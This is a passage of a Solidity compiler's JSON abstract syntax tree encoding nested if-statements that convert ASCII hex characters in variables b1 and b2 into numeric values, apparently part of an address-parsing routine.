																						"typeString": "bytes1"
																					}
																				],
																				"id": 788,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8974:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 787,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8974:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 794,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8974:17:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 786,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8966:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 785,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8966:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 795,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8966:26:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8961:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 797,
															"nodeType": "ExpressionStatement",
															"src": "8961:31:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 806,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 800,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 798,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 748,
																				"src": "9012:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 799,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9018:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9012:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 801,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9011:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 804,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 802,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 748,
																				"src": "9026:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 803,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9032:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9026:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 805,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9025:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9011:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 820,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 814,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 812,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 748,
																					"src": "9092:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 813,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9098:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9092:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 815,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9091:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 818,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 816,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 748,
																					"src": "9106:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 817,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9112:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9106:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 819,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9105:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9091:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 834,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 828,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 826,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 748,
																						"src": "9171:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 827,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9177:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9171:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 829,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9170:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 832,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 830,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 748,
																						"src": "9185:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 831,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9191:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9185:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 833,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9184:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9170:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 840,
																	"nodeType": "IfStatement",
																	"src": "9166:73:0",
																	"trueBody": {
																		"id": 839,
																		"nodeType": "Block",
																		"src": "9196:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 837,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 835,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 748,
																						"src": "9215:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 836,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9221:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9215:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 838,
																				"nodeType": "ExpressionStatement",
																				"src": "9215:8:0"
																			}
																		]
																	}
																},
																"id": 841,
																"nodeType": "IfStatement",
																"src": "9087:152:0",
																"trueBody": {
																	"id": 825,
																	"nodeType": "Block",
																	"src": "9117:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 823,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 821,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 748,
																					"src": "9136:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 822,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9142:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9136:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 824,
																			"nodeType": "ExpressionStatement",
																			"src": "9136:8:0"
																		}
																	]
																}
															},
															"id": 842,
															"nodeType": "IfStatement",
															"src": "9007:232:0",
															"trueBody": {
																"id": 811,
																"nodeType": "Block",
																"src": "9038:43:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 809,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 807,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 748,
																				"src": "9057:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 808,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9063:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9057:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 810,
																		"nodeType": "ExpressionStatement",
																		"src": "9057:8:0"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 851,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 845,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 843,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 751,
																				"src": "9258:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 844,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9264:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9258:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 846,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9257:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 849,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 847,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 751,
																				"src": "9272:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 848,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9278:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9272:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 850,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9271:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9257:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 865,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 859,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 857,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 751,
																					"src": "9338:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 858,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9344:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9338:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 860,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9337:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 863,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 861,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 751,
																					"src": "9352:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 862,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9358:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9352:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 864,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9351:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9337:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 879,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 873,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 871,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 751,
																						"src": "9417:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 872,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9423:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9417:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 874,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9416:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 877,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 875,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 751,
																						"src": "9431:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 876,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9437:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9431:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 878,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9430:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9416:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 885,
																	"nodeType": "IfStatement",
																	"src": "9412:73:0",
																	"trueBody": {
																		"id": 884,
																		"nodeType": "Block",
																		"src": "9442:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 882,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 880,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 751,
																						"src": "9461:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 881,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9467:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9461:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 883,
																				"nodeType": "ExpressionStatement",
																				"src": "9461:8:0"
																			}
																		]
																	}
																},
																"id": 886,
																"nodeType": "IfStatement",
																"src": "9333:152:0",
																"trueBody": {
																	"id": 870,
																	"nodeType": "Block",
																	"src": "9363:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 868,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 866,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 751,
																					"src": "9382:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 867,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9388:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9382:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 869,
																			"nodeType": "ExpressionStatement",
																			"src": "9382:8:0"
																		}
																	]
																}
															},
															"id": 887,
															"nodeType": "IfStatement",
															"src": "9253:232:0",
															"trueBody": {
																"id": 856,
																"nodeType": "Block",
																"src": "9284:43:0",
